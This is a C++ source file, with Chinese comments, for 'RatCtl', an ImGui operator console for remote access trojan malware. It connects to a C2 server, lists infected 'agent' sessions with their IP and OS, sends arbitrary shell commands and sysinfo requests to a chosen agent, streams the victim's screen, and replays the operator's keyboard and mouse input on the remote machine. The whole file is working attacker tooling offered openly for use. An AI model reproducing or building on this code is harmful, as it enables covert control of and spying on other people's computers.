/*
    cmake -S . -B build
    cmake --build build
*/

// main.cpp — im_ctl：ImGui 控制端（基于 ratctl 逻辑 + 屏幕流显示 + 输入回放）
#include <glad/glad.h> // 必须放在 GLFW 前面
#include <GLFW/glfw3.h>

#include "imgui.h"
#include "imgui_impl_glfw.h"
#include "imgui_impl_opengl3.h"

#include "ctl_client.h"

#include <atomic>
#include <cstdio>
#include <cstring>
#include <functional>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <algorithm>

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>

// ---- 全局状态 ----
static ctl::CtlClient g_client;
static std::vector<ctl::SessionInfo> g_sessions;
static std::string g_cur; // 当前 agent id
static std::mutex g_sessMx;
static std::string g_log; // 操作日志
static void log_line(const std::string &s)
{
    std::lock_guard<std::mutex> lk(g_sessMx);
    g_log += s + "\n";
    if (g_log.size() > 8192)
        g_log.erase(0, g_log.size() - 8192);
}
static bool focus_cmd_input = false;

// ---- 屏幕帧 ----
static ImVec2 g_imgPos(0, 0), g_imgSize(0, 0); // 当前帧图像区域（ImGui 屏幕坐标）
static std::mutex g_frameMx;
static std::vector<uint8_t> g_frameBgra; // 最新帧（BGRA）
static int g_frameW = 0, g_frameH = 0;
static uint32_t g_frameSeq = 0;
static GLuint g_tex = 0;
static std::atomic<bool> g_streamOn{false};
static std::atomic<bool> g_hookOn{false}; // 键鼠 hook 独立开关（默认关）

static char g_execBuf[512] = {0};
static int g_fps = 10;        // 屏幕流帧率
static int g_quality = 70;    // JPEG 质量
static int g_scalePct = 100;  // 抓屏缩放百分比（100=全分辨率，50=半分辨率省带宽）

// ---- 输入采集（LL hook，协议 §9.3）----
static HHOOK g_mouseHook = nullptr, g_kbdHook = nullptr;
static std::mutex g_evMx;
static std::vector<c2::InputEvent> g_events;
static uint32_t g_evSeq = 0;

static LRESULT CALLBACK mouse_proc(int code, WPARAM wp, LPARAM lp)
{
    if (code == HC_ACTION)
    {
        auto *ms = (MSLLHOOKSTRUCT *)lp;
        if (!(ms->flags & LLMHF_INJECTED))
        { // 过滤回放注入，防回环
            c2::InputEvent ev{};
            ev.seq = ++g_evSeq;
            ev.msg = (uint32_t)wp; // WM_MOUSEMOVE/按键/滚轮
            ev.x = ms->pt.x;
            ev.y = ms->pt.y;
            if (wp == WM_MOUSEWHEEL)
                ev.wheel = (int16_t)HIWORD(ms->mouseData);
            std::lock_guard<std::mutex> lk(g_evMx);
            if (g_events.size() < 512)
                g_events.push_back(ev);
        }
    }
    return CallNextHookEx(g_mouseHook, code, wp, lp);
}

static LRESULT CALLBACK kbd_proc(int code, WPARAM wp, LPARAM lp)
{
    if (code == HC_ACTION)
    {
        auto *kb = (KBDLLHOOKSTRUCT *)lp;
        if (!(kb->flags & LLKHF_INJECTED))
        {
            c2::InputEvent ev{};
            ev.seq = ++g_evSeq;
            ev.msg = (uint32_t)wp; // WM_KEYDOWN/UP/SYSKEYDOWN/SYSKEYUP
            ev.vk = kb->vkCode;
            std::lock_guard<std::mutex> lk(g_evMx);
            if (g_events.size() < 512)
                g_events.push_back(ev);
        }
    }
    return CallNextHookEx(g_kbdHook, code, wp, lp);
}

static void install_hooks()
{
    HINSTANCE hInst = GetModuleHandle(nullptr);
    g_mouseHook = SetWindowsHookExW(WH_MOUSE_LL, mouse_proc, hInst, 0);
    g_kbdHook = SetWindowsHookExW(WH_KEYBOARD_LL, kbd_proc, hInst, 0);
}

static void uninstall_hooks()
{
    if (g_mouseHook)
    {
        UnhookWindowsHookEx(g_mouseHook);
        g_mouseHook = nullptr;
    }
    if (g_kbdHook)
    {
        UnhookWindowsHookEx(g_kbdHook);
        g_kbdHook = nullptr;
    }
}

// 把采集到的事件批量发给当前 agent（仅在屏幕流激活时）
// 本地屏幕坐标（Hook）+ 图像矩形 → 远程像素坐标；区域外返回 false
static bool map_to_remote(int lx, int ly, int &rx, int &ry)
{
    if (g_imgSize.x <= 0 || g_imgSize.y <= 0)
        return false;
    int rw = 0, rh = 0;
    {
        std::lock_guard<std::mutex> lk(g_frameMx);
        rw = g_frameW;
        rh = g_frameH;
    }
    if (rw <= 0 || rh <= 0)
        return false;
    float fx = (lx - g_imgPos.x) / g_imgSize.x * (float)rw;
    float fy = (ly - g_imgPos.y) / g_imgSize.y * (float)rh;
    if (fx < 0.f || fy < 0.f || fx >= (float)rw || fy >= (float)rh)
        return false;
    rx = (int)fx;
    ry = (int)fy;
    return true;
}

// 本进程是否为前台（含多视口独立窗口）
static bool is_self_foreground()
{
    HWND fg = GetForegroundWindow();
    if (!fg)
        return false;
    DWORD pid = 0;
    GetWindowThreadProcessId(fg, &pid);
    return pid == GetCurrentProcessId();
}

// 事件发送：鼠标需落在图像区域内（坐标映射后替换）；键盘仅本程序前台时发送
static void flush_input_events()
{
    if (g_cur.empty() || !g_streamOn.load())
    {
        std::lock_guard<std::mutex> lk(g_evMx);
        g_events.clear();
        return;
    }
    std::vector<c2::InputEvent> batch;
    {
        std::lock_guard<std::mutex> lk(g_evMx);
        batch.swap(g_events);
    }
    if (batch.empty())
        return;

    bool foreground = is_self_foreground();
    std::vector<c2::InputEvent> out;
    out.reserve(batch.size());
    for (auto &ev : batch)
    {
        bool isMouse = (ev.msg >= WM_MOUSEFIRST && ev.msg <= WM_MOUSELAST);
        if (isMouse)
        {
            int rx = 0, ry = 0;
            if (!map_to_remote(ev.x, ev.y, rx, ry))
                continue; // 图像区域外：丢弃（避免误操作本地/远程其他区域）
            ev.x = rx;
            ev.y = ry;
        }
        else
        {
            if (!foreground)
                continue; // 键盘：仅 im_ctl 为前台窗口时采集发送
        }
        out.push_back(ev);
    }
    if (out.empty())
        return;
    std::string err;
    g_client.sendInputEvents(g_cur, out, err); // 实时流：失败忽略
}

// ---- 后台命令执行（避免阻塞 UI 线程；sendAndWait 可能等 240s）----
static std::atomic<bool> g_cmdBusy{false};
static void run_cmd_async(const std::function<void()> &fn)
{
    if (g_cmdBusy.load())
    {
        log_line("[!] command busy (previous still running)");
        return;
    }
    g_cmdBusy.store(true);
    std::thread([fn]()
                {
        struct BusyGuard
        {
            std::atomic<bool> &b;
            ~BusyGuard() { b.store(false); } // 无论正常/异常都复位
        } guard{g_cmdBusy};
        fn(); })
        .detach();
}

// ---- 窗口大小/位置持久化 ----
static void save_window_state(GLFWwindow *win)
{
    int w = 0, h = 0, x = 0, y = 0;
    glfwGetWindowSize(win, &w, &h);
    glfwGetWindowPos(win, &x, &y);
    FILE *f = fopen("ctl_window.ini", "w");
    if (f)
    {
        fprintf(f, "%d %d %d %d\n", x, y, w, h);
        fclose(f);
    }
}

static bool load_window_state(int &x, int &y, int &w, int &h)
{
    FILE *f = fopen("ctl_window.ini", "r");
    if (!f)
        return false;
    bool ok = fscanf(f, "%d %d %d %d", &x, &y, &w, &h) == 4;
    fclose(f);
    return ok && w > 200 && h > 200;
}

int main()
{
    SetProcessDPIAware(); // DPI 感知：让 Hook 的物理像素坐标与 ImGui 坐标一致
    // ---------- 初始化 GLFW ----------
    if (!glfwInit())
        return -1;
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 2);
    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);
    int winX = 100, winY = 100, winW = 1280, winH = 800;
    load_window_state(winX, winY, winW, winH); // 恢复上次窗口大小/位置
    GLFWwindow *window = glfwCreateWindow(winW, winH, "RatCtl (ImGui)", nullptr, nullptr);
    if (!window)
    {
        glfwTerminate();
        return -1;
    }
    glfwSetWindowPos(window, winX, winY);
    glfwMakeContextCurrent(window);
    glfwSwapInterval(1);
    if (!gladLoadGLLoader((GLADloadproc)glfwGetProcAddress))
    {
        return -1;
    }

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO &io = ImGui::GetIO();
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
    io.ConfigWindowsMoveFromTitleBarOnly = true; // 仅标题栏可拖动窗口（内容区域操作不再移动窗口）
    io.ConfigFlags |= ImGuiConfigFlags_DockingEnable;  // 启用 Docking（窗口停靠）
    io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable; // 多视口：窗口可拖出主界面成为独立窗口
    io.ConfigViewportsNoTaskBarIcon = false;             // 独立窗口在任务栏显示（便于最小化主窗口后切换）
    ImGui_ImplGlfw_InitForOpenGL(window, true);
    ImGui_ImplOpenGL3_Init("#version 150");

    // 1. 加载等宽英文字体（例如 Consolas、JetBrains Mono、Fira Code）
    ImFontConfig config;
    config.MergeMode = false; // 第一个字体作为基础
    ImFont *base_font = io.Fonts->AddFontFromFileTTF(
        "C:/Windows/Fonts/consola.ttf", // Consolas 等宽
        18.0f,
        &config,
        io.Fonts->GetGlyphRangesDefault() // 默认 ASCII 范围
    );

    // 2. 合并中文字体（微软雅黑）
    config.MergeMode = true; // 合并模式
    io.Fonts->AddFontFromFileTTF(
        "C:/Windows/Fonts/msyh.ttc", // 微软雅黑
        18.0f,
        &config,
        io.Fonts->GetGlyphRangesChineseFull() // 包含所有常用汉字
    );

    io.FontDefault = base_font;

    // 设置 ImGui 样式
    ImGui::StyleColorsDark();
    ImGuiStyle &style = ImGui::GetStyle();
    // style.ScaleAllSizes(1.1f); // 整体放大 20%
    // style.WindowRounding = 6.0f;
    // style.FrameRounding = 3.0f;
    // style.GrabRounding = 3.0f;
    // style.TabRounding = 4.0f;
    // style.ScrollbarRounding = 4.0f;
    // style.WindowPadding = ImVec2(10, 10);
    // style.FramePadding = ImVec2(8, 4);
    // style.ItemSpacing = ImVec2(8, 4);
    // style.ScrollbarSize = 12.0f;
    // style.Colors[ImGuiCol_WindowBg] = ImVec4(0.10f, 0.10f, 0.11f, 1.00f);
    // style.Colors[ImGuiCol_ChildBg] = ImVec4(0.08f, 0.08f, 0.09f, 1.00f);
    // style.Colors[ImGuiCol_PopupBg] = ImVec4(0.12f, 0.12f, 0.13f, 1.00f);
    // style.Colors[ImGuiCol_Border] = ImVec4(0.25f, 0.25f, 0.27f, 1.00f);
    // style.Colors[ImGuiCol_Header] = ImVec4(0.20f, 0.20f, 0.22f, 1.00f);
    // style.Colors[ImGuiCol_HeaderHovered] = ImVec4(0.27f, 0.27f, 0.30f, 1.00f);
    // style.Colors[ImGuiCol_HeaderActive] = ImVec4(0.30f, 0.30f, 0.34f, 1.00f);
    // style.Colors[ImGuiCol_Button] = ImVec4(0.18f, 0.18f, 0.20f, 1.00f);
    // style.Colors[ImGuiCol_ButtonHovered] = ImVec4(0.24f, 0.24f, 0.27f, 1.00f);
    // style.Colors[ImGuiCol_ButtonActive] = ImVec4(0.30f, 0.30f, 0.34f, 1.00f);
    // style.Colors[ImGuiCol_FrameBg] = ImVec4(0.13f, 0.13f, 0.14f, 1.00f);
    // style.Colors[ImGuiCol_FrameBgHovered] = ImVec4(0.18f, 0.18f, 0.20f, 1.00f);
    // style.Colors[ImGuiCol_FrameBgActive] = ImVec4(0.22f, 0.22f, 0.24f, 1.00f);
    // style.Colors[ImGuiCol_TitleBg] = ImVec4(0.08f, 0.08f, 0.09f, 1.00f);
    // style.Colors[ImGuiCol_TitleBgActive] = ImVec4(0.16f, 0.16f, 0.18f, 1.00f);
    // style.Colors[ImGuiCol_TitleBgCollapsed] = ImVec4(0.08f, 0.08f, 0.09f, 1.00f);
    // style.Colors[ImGuiCol_CheckMark] = ImVec4(0.40f, 0.70f, 1.00f, 1.00f);
    // style.Colors[ImGuiCol_SliderGrab] = ImVec4(0.40f, 0.70f, 1.00f, 1.00f);
    // style.Colors[ImGuiCol_SliderGrabActive] = ImVec4(0.60f, 0.80f, 1.00f, 1.00f);
    // style.Colors[ImGuiCol_Button] = ImVec4(0.18f, 0.18f, 0.20f, 1.00f); // 设置 ImGui 样式

    // ---------- 连接 C2 ----------
    std::string err;
    if (g_client.connect("127.0.0.1", 4444, err))
        log_line("[*] connected to C2");
    else
        log_line("[!] connect failed: " + err);

    // 帧回调（读线程）：解码 JPEG → 存最新帧
    g_client.setFrameCallback([](uint32_t seq, int w, int h,
                                 const uint8_t *jpeg, size_t len)
                              {
        std::vector<uint8_t> bgra;
        int dw = 0, dh = 0;
        if (ctl::decode_jpeg_to_bgra(jpeg, len, dw, dh, bgra)) {
            std::lock_guard<std::mutex> lk(g_frameMx);
            g_frameBgra = std::move(bgra);
            g_frameW = dw;
            g_frameH = dh;
            g_frameSeq = seq;
        } });

    // 输入采集 hook（须在 UI 线程安装，GLFW 消息循环泵事件）

    // ---------- 主循环 ----------
    while (!glfwWindowShouldClose(window))
    {
        glfwPollEvents();
        ImGui_ImplOpenGL3_NewFrame();
        ImGui_ImplGlfw_NewFrame();
        ImGui::NewFrame(); // 开始新的 ImGui 帧

        // ======== 在这里创建 DockSpace ========
        ImGuiViewport *viewport = ImGui::GetMainViewport();
        ImGui::SetNextWindowPos(viewport->WorkPos);
        ImGui::SetNextWindowSize(viewport->WorkSize);
        ImGui::SetNextWindowViewport(viewport->ID);
        ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 0.0f);
        ImGui::PushStyleVar(ImGuiStyleVar_WindowBorderSize, 0.0f);
        ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
        ImGui::Begin("MainDockSpace", nullptr,
                     ImGuiWindowFlags_NoDocking | ImGuiWindowFlags_NoTitleBar |
                         ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoResize |
                         ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoBringToFrontOnFocus |
                         ImGuiWindowFlags_NoNavFocus | ImGuiWindowFlags_NoBackground);
        ImGui::PopStyleVar(3);

        ImGuiID dockspace_id = ImGui::GetID("MyDockSpace");
        ImGui::DockSpace(dockspace_id, ImVec2(0.0f, 0.0f), ImGuiDockNodeFlags_PassthruCentralNode);
        ImGui::End();
        // =====================================

        // 屏幕流纹理（有新帧则上传）
        {
            std::lock_guard<std::mutex> lk(g_frameMx);
            if (!g_frameBgra.empty())
            {
                if (!g_tex)
                {
                    glGenTextures(1, &g_tex);
                    glBindTexture(GL_TEXTURE_2D, g_tex);
                    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);
                    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);
                }
                glBindTexture(GL_TEXTURE_2D, g_tex);
                glPixelStorei(GL_UNPACK_ALIGNMENT, 1);
                glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA8, g_frameW, g_frameH, 0,
                             GL_BGRA, GL_UNSIGNED_BYTE, g_frameBgra.data());
            }
        }

        // ---- 会话窗口 ----
        ImGui::SetNextWindowDockID(dockspace_id, ImGuiCond_FirstUseEver);
        ImGui::SetNextWindowSize(ImVec2(350, 500), ImGuiCond_FirstUseEver);
        if (ImGui::Begin("Sessions"))
        {
            if (ImGui::Button("Refresh"))
            {
                std::vector<ctl::SessionInfo> sess;
                std::string e;
                if (g_client.listSessions(sess, e))
                {
                    std::lock_guard<std::mutex> lk(g_sessMx);
                    g_sessions = std::move(sess);
                }
                else
                {
                    log_line("[!] sessions: " + e);
                }
            }
            ImGui::SameLine();
            ImGui::Text("current: %s", g_cur.empty() ? "(none)" : g_cur.substr(0, 8).c_str());

            ImGui::BeginTable("sess", 5, ImGuiTableFlags_RowBg);
            ImGui::TableSetupColumn("ID");
            ImGui::TableSetupColumn("IP");
            ImGui::TableSetupColumn("OS");
            ImGui::TableSetupColumn("LastSeen");
            ImGui::TableSetupColumn("Online");
            ImGui::TableHeadersRow();
            std::vector<ctl::SessionInfo> snap;
            {
                std::lock_guard<std::mutex> lk(g_sessMx);
                snap = g_sessions;
            }
            for (auto &s : snap)
            {
                ImGui::TableNextRow();
                ImGui::TableSetColumnIndex(0);
                if (ImGui::Selectable(s.id.c_str(), g_cur == s.id,
                                      ImGuiSelectableFlags_SpanAllColumns))
                {
                    g_cur = s.id;
                    log_line("[*] switched to " + s.id.substr(0, 8));
                }
                ImGui::TableSetColumnIndex(1);
                ImGui::Text("%s", s.ip.c_str());
                ImGui::TableSetColumnIndex(2);
                ImGui::Text("%s", s.os.c_str());
                ImGui::TableSetColumnIndex(3);
                ImGui::Text("%s", "?");
                ImGui::TableSetColumnIndex(4);
                ImGui::Text("%s", s.online ? "yes" : "no");
            }
            ImGui::EndTable();
        }
        ImGui::End();

        // ---- 控制窗口 ----
        ImGui::SetNextWindowDockID(dockspace_id, ImGuiCond_FirstUseEver);
        ImGui::SetNextWindowSize(ImVec2(400, 600), ImGuiCond_FirstUseEver);
        if (ImGui::Begin("Control"))
        {
            ImGui::Text("Agent: %s", g_cur.empty() ? "(none selected)" : g_cur.c_str());
            ImGui::Separator();
            if (ImGui::Button("sysinfo"))
            {
                if (g_cur.empty())
                    log_line("[!] no agent selected");
                else
                {
                    std::string target = g_cur; // 拷贝供后台线程使用
                    run_cmd_async([target]()
                                  {
                        std::string r, e;
                        if (g_client.sysinfo(target, r, e))
                            log_line(r);
                        else
                            log_line("[!] " + e); });
                }
            }
            ImGui::SameLine();
            if (ImGui::Button("back"))
            {
                g_cur.clear();
                log_line("[*] back");
            }
            ImGui::Separator();

            if (focus_cmd_input)
            {
                ImGui::SetKeyboardFocusHere();
                focus_cmd_input = false;
            }

            bool exec_pressed = ImGui::InputText("command", g_execBuf, sizeof(g_execBuf), ImGuiInputTextFlags_EnterReturnsTrue);
            ImGui::SameLine();
            if (ImGui::Button("exec") || exec_pressed)
            {
                if (g_cur.empty())
                    log_line("[!] no agent selected");
                else if (!g_execBuf[0])
                    log_line("[!] empty command");
                else
                {
                    std::string target = g_cur;
                    std::string cmd = g_execBuf;
                    run_cmd_async([target, cmd]()
                                  {
                        std::string r, e;
                        if (g_client.exec(target, cmd, r, e))
                            log_line(r);
                        else
                            log_line("[!] " + e); });

                    g_execBuf[0] = '\0';
                }
                if (exec_pressed)
                    focus_cmd_input = true;
            }
            ImGui::Separator();
            ImGui::SetNextItemWidth(120);
            ImGui::InputInt("fps", &g_fps);
            ImGui::SameLine();
            ImGui::SetNextItemWidth(120);
            ImGui::InputInt("quality", &g_quality);
            ImGui::SameLine();
            ImGui::SetNextItemWidth(120);
            ImGui::InputInt("scale%", &g_scalePct);
            if (g_fps < 1) g_fps = 1;
            if (g_fps > 60) g_fps = 60;
            if (g_quality < 10) g_quality = 10;
            if (g_quality > 100) g_quality = 100;
            if (g_scalePct < 10) g_scalePct = 10;
            if (g_scalePct > 100) g_scalePct = 100;
            if (ImGui::Button(g_streamOn.load() ? "stop stream" : "start stream"))
            {
                if (g_cur.empty())
                    log_line("[!] no agent selected");
                else
                {
                    std::string target = g_cur;
                    bool on = !g_streamOn.load();
                    int fps = g_fps, quality = g_quality, scalePct = g_scalePct;
                    // 立即翻转 UI 状态，命令在后台线程执行（不卡 UI）
                    g_streamOn.store(on);
                    log_line(on ? "[*] stream starting..." : "[*] stream stopping...");
                    run_cmd_async([target, on, fps, quality, scalePct]()
                                  {
                        std::string r, e;
                        if (!g_client.screenStream(target, on ? 1 : 0, (uint8_t)fps,
                                                   (uint8_t)quality, (uint8_t)scalePct, e))
                        {
                            g_streamOn.store(!on); // 失败回滚
                            log_line("[!] stream: " + e);
                        }
                        else
                        {
                            log_line(on ? "[*] stream started" : "[*] stream stopped");
                        } });
                }
            }
            ImGui::SameLine();
            if (ImGui::Button(g_hookOn.load() ? "hook: ON" : "hook: OFF"))
            {
                if (g_hookOn.load())
                {
                    uninstall_hooks();
                    g_hookOn.store(false);
                    log_line("[*] hook off (键鼠采集已停止)");
                }
                else
                {
                    install_hooks();
                    g_hookOn.store(true);
                    log_line("[*] hook on (开始采集键鼠，需先选 agent 并开启 stream)");
                }
            }
            ImGui::Separator();
            ImGui::TextUnformatted(g_log.c_str());
        }
        ImGui::End();

        // ---- 屏幕窗口 ----
        ImGui::SetNextWindowDockID(dockspace_id, ImGuiCond_FirstUseEver);
        ImGui::SetNextWindowSize(ImVec2(700, 600), ImGuiCond_FirstUseEver);
        if (ImGui::Begin("Screen"))
        {
            ImGui::Text("seq=%u %dx%d (stream %s)", g_frameSeq, g_frameW, g_frameH,
                        g_streamOn.load() ? "on" : "off");
            std::lock_guard<std::mutex> lk(g_frameMx);
            if (g_tex && !g_frameBgra.empty())
            {
                ImVec2 avail = ImGui::GetContentRegionAvail();
                float img_w = (float)g_frameW;
                float img_h = (float)g_frameH;
                if (img_w > 0 && img_h > 0 && avail.x > 0 && avail.y > 0)
                {
                    float scale = (std::min)(avail.x / img_w, avail.y / img_h);
                    ImVec2 display_size(img_w * scale, img_h * scale);
                    // 居中绘制，并记录图像矩形（供输入坐标映射）
                    ImGui::SetCursorPosX(ImGui::GetCursorPosX() + (avail.x - display_size.x) * 0.5f);
                    ImGui::SetCursorPosY(ImGui::GetCursorPosY() + (avail.y - display_size.y) * 0.5f);
                    g_imgPos = ImGui::GetCursorScreenPos();
                    g_imgSize = display_size;
                    ImGui::Image((ImTextureID)(intptr_t)g_tex, display_size);
                }
                else
                {
                    g_imgSize = ImVec2(0, 0);
                }
            }
            else
            {
                ImGui::Text("(no frame yet - start stream)");
            }
        }
        ImGui::End();

        ImGui::Render();
        int displayW, displayH;
        glfwGetFramebufferSize(window, &displayW, &displayH);
        glViewport(0, 0, displayW, displayH);
        glClearColor(0.1f, 0.1f, 0.1f, 1.0f);
        glClear(GL_COLOR_BUFFER_BIT);
        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());
        glfwSwapBuffers(window);

        // 批量发送采集到的输入事件（屏幕流激活时）
        flush_input_events();

        // 多视口：渲染独立窗口（屏幕窗口拖出主界面后在此绘制）
        if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)
        {
            ImGui::UpdatePlatformWindows();
            ImGui::RenderPlatformWindowsDefault();
            glfwMakeContextCurrent(window); // 恢复主窗口上下文
        }
    }

    save_window_state(window); // 记住窗口大小/位置
    ImGui::DestroyPlatformWindows(); // 关闭多视口独立窗口
    uninstall_hooks();
    ImGui_ImplOpenGL3_Shutdown();
    ImGui_ImplGlfw_Shutdown();
    ImGui::DestroyContext();
    glfwDestroyWindow(window);
    glfwTerminate();
    return 0;
}
